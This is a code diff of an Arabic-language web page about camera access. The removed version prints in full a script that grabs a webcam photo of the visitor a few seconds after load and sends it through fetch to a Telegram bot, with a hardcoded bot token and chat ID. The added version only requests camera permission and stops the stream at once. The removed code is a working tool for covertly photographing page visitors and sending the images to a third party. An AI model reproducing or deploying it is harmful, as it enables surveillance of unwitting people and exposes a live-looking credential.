@@ -1,60 +1,14 @@
-<!DOCTYPE html>
-<html lang="ar">
-<head>
-  <meta charset="UTF-8">
-  <title>التقاط صورة وإرسالها إلى تليجرام</title>
-</head>
-<body style="text-align:center; padding-top:50px; background:#111; color:#0f0;">
-  <h2>يرجى السماح باستخدام الكاميرا</h2>
-  <video id="video" width="640" height="480" autoplay playsinline></video>
-  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
-
-  <script>
-    const botToken = '7902247042:AAGhKg-93qflFaPHVrIa6QPwY3ruRVk5Fs4
-'; // ← استبدل هذا بتوكن البوت
-    const chatId = '1702324511';     // ← استبدل هذا بـ Chat ID
-
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
-
-    window.onload = function () {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          video.srcObject = stream;
-
-          // بعد 3 ثوانٍ يتم التقاط صورة
-          setTimeout(() => {
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-            canvas.toBlob(blob => {
-              sendToTelegram(blob); // ← إرسال الصورة إلى تليجرام
-            }, 'image/png');
-          }, 3000);
-        })
-        .catch(error => {
-          console.error('فشل الوصول إلى الكاميرا:', error);
-        });
-    };
-
-    function sendToTelegram(blob) {
-      const formData = new FormData();
-      formData.append('chat_id', chatId);
-      formData.append('photo', blob, 'photo.png');
-
-      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-        method: 'POST',
-        body: formData
-      })
-      .then(response => response.json())
-      .then(data => {
-        console.log('تم الإرسال:', data);
-        alert('تم إرسال الصورة إلى تيليجرام!');
+<script>
+  // عند تحميل الصفحة، نطلب الإذن للوصول إلى الكاميرا فقط
+  window.onload = function () {
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        // تم السماح - نوقف تشغيل الكاميرا فورًا
+        stream.getTracks().forEach(track => track.stop());
+        console.log('تم منح الإذن للكاميرا');
       })
       .catch(error => {
-        console.error('فشل الإرسال:', error);
-        alert('فشل إرسال الصورة!');
+        console.error('رفض المستخدم الوصول للكاميرا:', error);
       });
-    }
-  </script>
-</body>
-</html>
+  };
+</script>
